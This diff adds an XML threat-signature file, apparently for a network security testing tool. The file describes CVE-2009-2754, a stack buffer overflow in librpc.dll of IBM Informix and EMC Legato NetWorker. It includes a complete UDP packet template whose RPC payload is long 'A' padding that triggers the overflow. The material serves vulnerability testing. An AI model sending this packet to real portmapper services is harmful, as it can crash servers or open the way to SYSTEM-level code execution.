@@ -1,0 +1,75 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Multiple Vendors librpc.dll Stack Buffer Overflow"/>
+    <EngDesc display="true" value="A buffer overflow vulnerability exists in IBM's Informix Dynamic Server and EMC's Legato Networker. The vulnerability is due to insufficient validation of user input during authentication by the RPC protocol parsing library, librpc.dll. the library is used by the Portmapper service (portmap.exe). An attacker can exploit this vulnerability to cause stack based buffer overflow which can lead to arbitrary code execution in the context of the affected service, which is SYSTEM."/>
+    <Intent display="true">
+      <item value="Code_Execution/Buffer_Overflow"/>
+    </Intent>
+    <Protocol display="true" value="Portmapper-RPC"/>
+    <Type_Of_Equipment display="true">
+      <item value="Server"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="IBM/EMC"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="IBM_Informix_Dynamic_Server/EMC_Legato_NetWorker"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="IBM_Informix_Dynamic_Server_prior_to_10.00.TC9&amp;prior_to_11.10.TC3/EMC_Legato_NetWorker_7.x.x"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2009-2754"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="0eae480173a6f5dd5abbca8878c78ca3"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="634042467483834814"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="UDP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1269003713" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="B"/>
+    <NamedVar name="sourcePort" type="ImperfectControls.Port" value="null" index="C"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="F"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="D"/>
+      <for index="B"/>
+      <for index="E"/>
+      <for index="C"/>
+      <for index="F"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0282" Identification="82CA" FragmentOffset="0000" TTL="40" Protocol="11" HeaderChecksum="53D9" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <UDP srcPort="$sourcePort" destPort="$destPort" checksum="4638" length="026E" Payload="B0EEF0110000000000000002000186A00000000200000005000000010000020453535353FFFFFFFF414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141410000000000000000000000000000000000000186A000000002000000000000001E414141414141414141414141414141414141414141414141414141414141"/>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
